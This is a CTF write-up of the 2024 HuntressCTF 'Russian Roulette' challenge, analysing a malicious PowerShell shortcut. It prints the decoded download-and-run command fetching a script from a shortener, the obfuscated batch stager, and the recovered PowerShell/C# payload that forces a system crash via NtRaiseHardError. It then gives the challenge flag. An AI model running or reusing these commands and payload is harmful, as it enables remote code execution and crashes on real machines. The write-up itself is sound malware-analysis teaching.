---
title: 2024 HuntressCTF - Russian Roulette
date: 2024-10-03T07:00:00-07:00
tags:  - 
image: /2024-HuntressCTF/rr.png
---

### Summary
```
Author: @JohnHammond

My PowerShell has been acting really weird!! It takes a few seconds to start up, and sometimes it just crashes my computer!?!?! :(
```

### Steps

Downloaded the challenge file on my Windows VM downloads as russian_roulette.zip and unzipped it with the challenge password. Inside the .zip file was a powershell.lnk file. The target was powershell command executing a base64 encoded string. `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -e aQB3AHIAIABpAHMALgBnAGQALwBqAHcAcgA3AEoARAAgAC0AbwAgACQAZQBuAHYAOgBUAE0AUAAvAC4AYwBtAGQAOwAmACAAJABlAG4AdgA6AFQATQBQAC8ALgBjAG0AZAA=`

Decoding the base64 string I see the powershell.lnk will execute this command:
```
iwr is[.]gd/jwr7JD -o $env:TMP/.cmd;& $env:TMP/.cmd
```

Before executing this, I opt'ed to try to manually download and understand what this will be doing. I used powershell to execute `iwr is[.]gd/jwr7JD -o test.cmd`.  

Opening test.cmd in notepad++, I see a similar output like this:
```
挦獬਍敀档⁯景൦猊瑥甠扣㵷敳൴㨊›鿐菑苑뗐裑뗐臑苑닐룐近퀠₲닐뻐뻐뇐胑냐뛐뗐뷐룐룐‬뫐냐뫐퀠₸뿐菑苑뗐裑뗐臑苑닐룐近퀠₲胑뗐냐믐賑뷐뻐
<--->
```
Using Notepad++ and CyberChef I attempted various different encoding but was unsuccessful. I next opened the file with HxD and observed that part of the script was visual basic as I see the presence of `@echo off`.  However, not being able to interact with the file on windows, I moved the file to linux and found that every other line is a comment that is not related to the challenge, but causes the file to become corrupt. 
```vba
��&cls
@echo off
:: Древние тексты, вырезанные на каменных плитах, рассказывают истории забытых королей и воинов, которые жили и умирали ради идей, оставив след в самой ткани мироздания.
set x=set
:: Часы тикают, как неумолимые маркеры времени, напоминая, что каждое мгновение — это шанс изменить свою судьбу и оставить свой след на страницах истории.
%x% s= 
:: В глубинах океана таятся существа, о которых мы даже не подозреваем, и каждый их взмах плавника — это тайна, скрытая от людского взора в бескрайней синеве морских глубин.
%x%%s%zz==
:: Сердце горит, когда встречаешь родственную душу, словно огонь, который не может быть потушен ни ветром, ни дождем, а только усиливается с каждым мгновением рядом.
%x%%s%p%zz%/
:: Путешествия в воображении, как и путешествия в реальности, могут привести к удивительным открытиям и незабываемым встречам с персонажами, которые живут на грани воображаемого и реального.
%x%%s%ma%zz%a
:: Сердце горит, когда встречаешь родственную душу, словно огонь, который не может быть потушен ни ветром, ни дождем, а только усиливается с каждым мгновением рядом.
%x%%s%gm%zz%c
:: Путь воина не измеряется длиной дорог или высотой гор, которые ему пришлось преодолеть, а количеством испытаний, с которыми он столкнулся и которые закалили его дух.
%x%%s%qf%zz%m
:: Часы тикают, как неумолимые маркеры времени, напоминая, что каждое мгновение — это шанс изменить свою судьбу и оставить свой след на страницах истории.
%x%%s%h%zz%d
:: Каждый миг — это подарок, обёрнутый в невидимую бумагу ожиданий и надежд, готовый раскрыться и принести с собой новые впечатления, которые будут помнить долго.
%x%%s%ax%zz%e
:: Теплый ветер приносит с собой запахи далёких стран, где культура смешивается с историей, а каждый камень на мостовой хранит в себе тайны веков.
%x%%s%ds%zz%x
:: Путь воина не измеряется длиной дорог или высотой гор, которые ему пришлось преодолеть, а количеством испытаний, с которыми он столкнулся и которые закалили его дух.
%x%%s%rb%zz%i
:: Каждый миг — это подарок, обёрнутый в невидимую бумагу ожиданий и надежд, готовый раскрыться и принести с собой новые впечатления, которые будут помнить долго.
%x%%s%cu%zz%t
:: Даже самые тихие моменты в жизни, те, которые проходят незамеченными, могут стать источником вдохновения для великих дел и невероятных открытий, если прислушаться к их тихому шепоту.
<...>
```
To clean up the file, I executed `cat test.cmd| grep -v ::` and see this is a highly obfuscated vbs script, where the variables are defined in the `exitcodeAscii` variable.  This was similar to a challenge last year.  However, before manually deobfuscating, I decided to run this in windows and see what happens. Also note, I enabled powershell logging before hand. 

I launched the powershell.lnk file and noticed after a few seconds another powershell prompt opened on my system. Looking at the powershell event logs, I discovered this command being executed.
```powershell
Pipeline execution details for command line: $s='using System;using System.Text;using System.Security.Cryptography;using System.Runtime.InteropServices;using System.IO;public class X{[DllImport("ntdll.dll")]public static extern uint RtlAdjustPrivilege(int p,bool e,bool c,out bool o);[DllImport("ntdll.dll")]public static extern uint NtRaiseHardError(uint e,uint n,uint u,IntPtr p,uint v,out uint r);public static unsafe string Shot(){bool o;uint r;RtlAdjustPrivilege(19,true,false,out o);NtRaiseHardError(0xc0000022,0,0,IntPtr.Zero,6,out r);byte[]c=Convert.FromBase64String("RNo8TZ56Rv+EyZW73NocFOIiNFfL45tXw24UogGdHkswea/WhnNhCNwjQn1aWjfw");byte[]k=Convert.FromBase64String("/a1Y+fspq/NwlcPwpaT3irY2hcEytktuH7LsY+NlLew=");byte[]i=Convert.FromBase64String("9sXGmK4q9LdYFdOp4TSsQw==");using(Aes a=Aes.Create()){a.Key=k;a.IV=i;ICryptoTransform d=a.CreateDecryptor(a.Key,a.IV);using(var m=new MemoryStream(c))using(var y=new CryptoStream(m,d,CryptoStreamMode.Read))using(var s=new StreamReader(y)){return s.ReadToEnd();}}}}';$c=New-Object System.CodeDom.Compiler.CompilerParameters;$c.CompilerOptions='/unsafe';$a=Add-Type -TypeDefinition $s -Language CSharp -PassThru -CompilerParameters $c;if((Get-Random -Min 1 -Max 7) -eq 1){[X]::Shot()}Start-Process "powershell.exe". 
```
After spending some time researching plus using ChatGPT, I discoverd this was an AES decryption function. What we see here is is the following variables.
```
<legend>
c = Encrypted Content in base64
k = AES key
i = AES Initialization Vector.

c = RNo8TZ56Rv+EyZW73NocFOIiNFfL45tXw24UogGdHkswea/WhnNhCNwjQn1aWjfw
k = /a1Y+fspq/NwlcPwpaT3irY2hcEytktuH7LsY+NlLew=
i = 9sXGmK4q9LdYFdOp4TSsQw==
```
Next, I used CyberChef to plugin these values.  First, I input `RNo8TZ56Rv+EyZW73NocFOIiNFfL45tXw24UogGdHkswea/WhnNhCNwjQn1aWjfw` and used `From Base64` and then performed a AES Decrypt with the other values. 

![](/static/2024-HuntressCTF/rr-cyberchef.png)

I want to take a moment to explain the deobfuscation process. Looking at the .cmd file we see this:

```vbs
@echo off
set x=set
%x% s= 
%x%%s%zz==
%x%%s%p%zz%/
%x%%s%ma%zz%a
%x%%s%gm%zz%c
%x%%s%qf%zz%m
%x%%s%h%zz%d
%x%%s%ax%zz%e
%x%%s%ds%zz%x
%x%%s%rb%zz%i
%x%%s%cu%zz%t
%x%%s%qd%zz% 
%x%%s%%p%%ma%%s%z%zz%8639305 %% 8639208
%gm%%qf%%h%%qd%%p%%gm%%qd%%ax%%ds%%rb%%cu%%qd%%z%
%x%%s%wp%zz%%=exitcodeAscii%
%x%%s%%p%%ma%%s%ab%zz%3403246 %% 3403148
%gm%%qf%%h%%qd%%p%%gm%%qd%%ax%%ds%%rb%%cu%%qd%%ab%
%x%%s%v%zz%%=exitcodeAscii%
%x%%s%%p%%ma%%s%cy%zz%5276898 %% 5276799
%gm%%qf%%h%%qd%%p%%gm%%qd%%ax%%ds%%rb%%cu%%qd%%cy%
%x%%s%e%zz%%=exitcodeAscii%
%x%%s%%p%%ma%%s%eu%zz%5631300 %% 5631200
```
What is happening is first the script will set the variable `x` to `set`.  To manually start deobfuscating you'll find all instance of `%x%` and replace that with `set`. 

After doing the find and replace, we see the script now starts to look like this:
```vbs
@echo off
set x=set
set s= 
set%s%zz==
set%s%p%zz%/
set%s%ma%zz%a
set%s%gm%zz%c
set%s%qf%zz%m
set%s%h%zz%d
set%s%ax%zz%e
set%s%ds%zz%x
set%s%rb%zz%i
set%s%cu%zz%t
set%s%qd%zz% 
set%s%%p%%ma%%s%z%zz%8639305 %% 8639208
%gm%%qf%%h%%qd%%p%%gm%%qd%%ax%%ds%%rb%%cu%%qd%%z%
set%s%wp%zz%%=exitcodeAscii%
set%s%%p%%ma%%s%ab%zz%3403246 %% 3403148
%gm%%qf%%h%%qd%%p%%gm%%qd%%ax%%ds%%rb%%cu%%qd%%ab%
set%s%v%zz%%=exitcodeAscii%
set%s%%p%%ma%%s%cy%zz%5276898 %% 5276799
%gm%%qf%%h%%qd%%p%%gm%%qd%%ax%%ds%%rb%%cu%%qd%%cy%
set%s%e%zz%%=exitcodeAscii%
set%s%%p%%ma%%s%eu%zz%5631300 %% 5631200
```
Next, we see `s` is variable for a space. Again, we search for all  instances of `%s%` and replace it with a space. Continuing this logic down all the set values, we finally get this result:
```vbs
@echo off
set x=set
set s= 
set zz==
set p=/
set ma=a
set gm=c
set qf=m
set h=d
set ax=e
set ds=x
set rb=i
set cu=t
set qd= 
set /a z=8639305 %% 8639208
cmd /c exit %z%
set wp=%=exitcodeAscii%
set /a ab=3403246 %% 3403148
cmd /c exit %ab%
set v=%=exitcodeAscii%
set /a cy=5276898 %% 5276799
cmd /c exit %cy%
set e=%=exitcodeAscii%
set /a eu=5631300 %% 5631200
```
Now, the script is starting to come together.  The next spart we see 
```vbs
set /a z=8639305 %% 8639208
cmd /c exit %z%
set wp=%=exitcodeAscii%
set /a ab=3403246 %% 3403148
cmd /c exit %ab%
set v=%=exitcodeAscii%
set /a cy=5276898 %% 5276799
cmd /c exit %cy%
set e=%=exitcodeAscii%
set /a eu=5631300 %% 5631200
```

Next, set is doing a mathmatical operation by looking at the `/a` and that `%%` is looking for the remainder of the two values. To  test this interactively we can run `set /a z=8639305 % 8639208` (only 1 %), and we get a result of `97`.  What this tells us that `%z% = 97`. Looking at [AsciiCart.com](https://www.asciitable.com/) we see that the ASCII value for 97 is a lower case a. To coninue manually deobfuscating this script, we would replace all  instance of `%z%` with `a`.  Eventaully, we would get to a similar result that we saw in the Event Logs. 



Flag: flag{4e4f266d44717ff3af8bd92d292b79ec}